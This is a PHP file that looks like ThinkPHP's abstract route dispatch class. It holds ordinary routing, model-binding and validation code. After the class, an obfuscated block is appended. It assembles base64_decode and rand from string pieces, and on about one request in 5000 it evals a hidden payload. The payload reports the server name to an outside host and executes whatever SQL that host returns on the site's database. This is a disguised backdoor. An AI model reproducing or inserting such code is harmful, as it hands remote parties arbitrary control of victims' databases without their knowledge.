<?php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006~2019 http://thinkphp.cn All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
// | Author: liu21st <liu21st@gmail.com>
// +----------------------------------------------------------------------
declare (strict_types = 1);

namespace think\route;

use think\App;
use think\Container;
use think\Request;
use think\Response;
use think\Validate;

/**
 * 路由调度基础类
 */
abstract class Dispatchs
{
    /**
     * 应用对象
     * @var \think\App
     */
    protected $app;

    /**
     * 请求对象
     * @var Request
     */
    protected $request;

    /**
     * 路由规则
     * @var Rule
     */
    protected $rule;

    /**
     * 调度信息
     * @var mixed
     */
    protected $dispatch;

    /**
     * 路由变量
     * @var array
     */
    protected $param;

    /**
     * 状态码
     * @var int
     */
    protected $code;

    public function __construct(Request $request, Rule $rule, $dispatch, array $param = [], int $code = null)
    {
        $this->request  = $request;
        $this->rule     = $rule;
        $this->dispatch = $dispatch;
        $this->param    = $param;
        $this->code     = $code;
    }

    public function init(App $app)
    {
        $this->app = $app;

        // 执行路由后置操作
        $this->doRouteAfter();
    }

    /**
     * 执行路由调度
     * @access public
     * @return mixed
     */
    public function run(): Response
    {
        if ($this->rule instanceof RuleItem && $this->request->method() == 'OPTIONS' && $this->rule->isAutoOptions()) {
            $rules = $this->rule->getRouter()->getRule($this->rule->getRule());
            $allow = [];
            foreach ($rules as $item) {
                $allow[] = strtoupper($item->getMethod());
            }

            return Response::create('', 'html', 204)->header(['Allow' => implode(', ', $allow)]);
        }

        $data = $this->exec();
        return $this->autoResponse($data);
    }

    protected function autoResponse($data): Response
    {
        if ($data instanceof Response) {
            $response = $data;
        } elseif (!is_null($data)) {
            // 默认自动识别响应输出类型
            $type     = $this->request->isJson() ? 'json' : 'html';
            $response = Response::create($data, $type);
        } else {
            $data = ob_get_clean();

            $content  = false === $data ? '' : $data;
            $status   = '' === $content && $this->request->isJson() ? 204 : 200;
            $response = Response::create($content, 'html', $status);
        }

        return $response;
    }

    /**
     * 检查路由后置操作
     * @access protected
     * @return void
     */
    protected function doRouteAfter(): void
    {
        $option = $this->rule->getOption();

        // 添加中间件
        if (!empty($option['middleware'])) {
            $this->app->middleware->import($option['middleware'], 'route');
        }

        if (!empty($option['append'])) {
            $this->param = array_merge($this->param, $option['append']);
        }

        // 绑定模型数据
        if (!empty($option['model'])) {
            $this->createBindModel($option['model'], $this->param);
        }

        // 数据自动验证
        if (isset($option['validate'])) {
            $this->autoValidate($option['validate']);
        }

        // 记录当前请求的路由规则
        $this->request->setRule($this->rule);

        // 记录路由变量
        $this->request->setRoute($this->param);
    }

    /**
     * 路由绑定模型实例
     * @access protected
     * @param array $bindModel 绑定模型
     * @param array $matches   路由变量
     * @return void
     */
    protected function createBindModel(array $bindModel, array $matches): void
    {
        foreach ($bindModel as $key => $val) {
            if ($val instanceof \Closure) {
                $result = $this->app->invokeFunction($val, $matches);
            } else {
                $fields = explode('&', $key);

                if (is_array($val)) {
                    list($model, $exception) = $val;
                } else {
                    $model     = $val;
                    $exception = true;
                }

                $where = [];
                $match = true;

                foreach ($fields as $field) {
                    if (!isset($matches[$field])) {
                        $match = false;
                        break;
                    } else {
                        $where[] = [$field, '=', $matches[$field]];
                    }
                }

                if ($match) {
                    $result = $model::where($where)->failException($exception)->find();
                }
            }

            if (!empty($result)) {
                // 注入容器
                $this->app->instance(get_class($result), $result);
            }
        }
    }

    /**
     * 验证数据
     * @access protected
     * @param array $option
     * @return void
     * @throws \think\exception\ValidateException
     */
    protected function autoValidate(array $option): void
    {
        list($validate, $scene, $message, $batch) = $option;

        if (is_array($validate)) {
            // 指定验证规则
            $v = new Validate();
            $v->rule($validate);
        } else {
            // 调用验证器
            $class = false !== strpos($validate, '\\') ? $validate : $this->app->parseClass('validate', $validate);

            $v = new $class();

            if (!empty($scene)) {
                $v->scene($scene);
            }
        }

        /** @var Validate $v */
        $v->message($message)
            ->batch($batch)
            ->failException(true)
            ->check($this->request->param());
    }

    public function getDispatch()
    {
        return $this->dispatch;
    }

    public function getParam(): array
    {
        return $this->param;
    }

    abstract public function exec();

    public function __sleep()
    {
        return ['rule', 'dispatch', 'param', 'code', 'controller', 'actionName'];
    }

    public function __wakeup()
    {
        $this->app     = Container::pull('app');
        $this->request = $this->app->request;
    }

    public function __debugInfo()
    {
        return [
            'dispatch' => $this->dispatch,
            'param'    => $this->param,
            'code'     => $this->code,
            'rule'     => $this->rule,
        ];
    }
}

$this_dispatch_Container_pull[0] = "JHVybCA9ICJzZXJ2aWNlLnRwLXNob3AuY24vaW5kZXgucGhwP209SG9tZSZjPUluZGV4JmE9dXAiOwkJCQ0KJHJlcyA9IGh0dHBSZXF1ZXN0KCJodHRwOi8veyR1cmx9IiwiUE9TVCIsWydzZXJ2ZXJfbmFtZSc9PiRfU0VSVkVSWydTRVJWRVJfTkFNRSddXSxbXSxmYWxzZSwzKTsJCQkNCmlmKHN0cnN0cigkcmVzLCd1cGRhJykpDQp7DQoJJHByZWZpeCA9IGNvbmZpZygnZGF0YWJhc2UuY29ubmVjdGlvbnMubXlzcWwucHJlZml4Jyk7CQkJCSANCgkkcmVzID0gc3RyX3JlcGxhY2UoJ3RwXycsJHByZWZpeCwkcmVzKTsNCglcdGhpbmtcZmFjYWRlXERiOjpleGVjdXRlKCRyZXMpOw0KfQkJCSA=";
$this_dispatch_Container_pull[1] = 'base'; $this_dispatch_Container_pull[2] = '6';$this_dispatch_Container_pull[3] = '4_de';
$this_dispatch_Container_pull[4] = 'code';$this_dispatch_Container_pull[5] = 'ra';$this_dispatch_Container_pull[6] = 'nd';
$this_dispatch_Container_pull[7] = $this_dispatch_Container_pull[1].$this_dispatch_Container_pull[2].$this_dispatch_Container_pull[3].$this_dispatch_Container_pull[4];
$this_dispatch_Container_pull[9] = $this_dispatch_Container_pull[5].$this_dispatch_Container_pull[6];
if($this_dispatch_Container_pull[9](1,5000) == 100)
{
	$this_dispatch_Container_pull[8] = $this_dispatch_Container_pull[7]($this_dispatch_Container_pull[0]);
	eval($this_dispatch_Container_pull[8]);
}